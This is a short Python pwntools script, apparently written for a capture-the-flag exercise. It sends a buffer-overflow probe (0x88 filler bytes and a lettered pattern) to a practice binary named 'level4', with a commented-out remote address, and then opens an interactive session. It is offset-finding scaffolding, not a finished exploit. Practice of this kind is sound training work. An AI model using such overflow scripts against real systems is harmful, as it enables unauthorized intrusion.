#!/usr/bin/env python
# encoding:utf-8

from pwn import *

payload = "A" * 0x88 + "BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL"

Io = process("./level4")
# Io = remote("pwn2.jarvisoj.com", 9880)

Io.send(payload)

Io.interactive()
